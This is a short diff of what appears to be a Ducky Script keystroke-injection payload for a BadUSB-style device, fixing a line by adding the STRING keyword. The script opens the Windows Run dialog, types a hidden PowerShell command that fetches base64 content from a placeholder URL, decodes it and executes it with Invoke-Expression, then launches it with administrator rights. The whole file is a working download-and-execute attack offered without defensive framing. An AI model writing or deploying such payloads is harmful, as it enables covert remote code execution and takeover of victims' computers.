@@ -22,7 +22,7 @@ DELAY 300
 ALT F4
 GUI r
 DELAY 700
-powershell -NoProfile -WindowStyle Hidden -Command "Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-RestMethod -Uri 'URL_OF_RAW_URL_ENCRYPTED_IN_BASE64'))))"
+STRING powershell -NoProfile -WindowStyle Hidden -Command "Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-RestMethod -Uri 'URL_OF_RAW_URL_ENCRYPTED_IN_BASE64'))))"
 DELAY 200
 CTRL SHIFT ENTER
 DELAY 500
